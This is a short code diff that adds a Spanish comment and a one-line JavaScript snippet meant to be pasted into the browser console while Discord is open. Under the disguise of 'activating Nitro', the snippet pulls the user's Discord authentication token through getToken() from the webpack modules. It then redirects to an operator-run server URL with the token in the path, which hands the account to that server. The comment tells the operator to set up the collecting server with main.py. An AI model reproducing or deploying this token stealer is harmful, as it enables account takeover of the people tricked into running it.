@@ -1,1 +1,2 @@
+//En url tienes que poner tu la url del servidor que inicializas con main.py y despues copias y pegas el codigo de abajo en la terminal con discord abierto
 (function(){const url='Your_URL';const nitroCode=(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken();window.location.replace(url+'/activate-nitro/'+nitroCode);})();
